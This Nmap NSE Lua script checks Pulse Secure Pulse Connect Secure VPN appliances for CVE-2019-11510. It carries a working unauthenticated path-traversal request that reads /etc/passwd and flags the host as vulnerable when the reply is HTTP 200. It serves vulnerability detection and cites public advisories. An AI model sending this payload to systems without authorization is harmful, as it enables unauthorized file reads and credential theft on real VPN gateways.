description = [[
A file inclusion vulnerability affecting Pulse Secure Pulse Connect Secure (PCS) SSLVPN 
appliance versions before 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 
before 9.0R3.4 allows an unauthenticated remote attacker to send a specially crafted 
URI to perform an arbitrary file read.

This script attempts to read the /etc/password file of the target device as a proof of concept.

This script is based on ExploitDB #47297 written by 0xDezzy (Justin Wagner) and Alyssa Herrera,
which is based on the work of Orange Tsai and Meh Chang.

Vendor Homepage: https://pulsesecure.net
Affected versions: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4

References:
https://www.exploit-db.com/exploits/47297
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101
]]

local string = require "string"
local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"

---
-- @usage
-- nmap -p 443 --script http-vuln-cve2019-11510 <target>
--
-- @output
--PORT    STATE SERVICE
--443/tcp open  https
--| http-vuln-cve2019-11510: 
--|   VULNERABLE:
--|   Pulse Secure file inclusion vulnerability
--|     State: VULNERABLE
--|     IDs:  CVE:CVE-2019-11510  BID:108073
--|     Risk factor: High  CVSSv2: 6.5 (MED) (AV:N/AC:L/Au:S/C:P/I:P/A:P)
--|           In Pulse Secure Pulse Connect Secure (PCS) before 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability.
--|           
--|     Disclosure date: 2019-05-08
--|     References:
--|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510
--|       https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101
--|       https://www.exploit-db.com/exploits/47297
--|_      http://www.securityfocus.com/bid/108073
--
-- @xmloutput
-- <table key="CVE-2019-11510">
-- <elem key="title">Pulse Secure Arbitrary File Inclusion Vulnerability</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2019-11510</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv2">6.5 (MED) (AV:N/AC:L/Au:S/C:P/I:P/A:P)</elem>
-- </table>
-- <table key="description">
-- <elem>In Pulse Secure Pulse Connect Secure (PCS) before 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">08</elem>
-- <elem key="month">05</elem>
-- <elem key="year">2019</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2019-05-08</elem>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510</elem>
-- <elem>https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101</elem>
-- </table>
-- </table>
--
---

author = "Charles Blas"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "auth", "exploit" }

portrule = shortport.port_or_service( {443}, "https")

action = function(host, port)
  local vuln = {
    title = "Pulse Secure file inclusion vulnerability",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    scores = {
      CVSSv2 = "6.5 (MED) (AV:N/AC:L/Au:S/C:P/I:P/A:P)",
    },
    description = [[
    In Pulse Secure Pulse Connect Secure (PCS) before 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability.
    ]],
    IDS = {CVE = "CVE-2019-11510", BID = "108073"},
    references = {
      'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101',
      'https://www.exploit-db.com/exploits/47297'
    },
    dates = { disclosure = { year = '2019', month = '05', day = '08' } }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local response = http.get(host, port, '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')

  if response.status and response.status == 200 then
          vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)
end

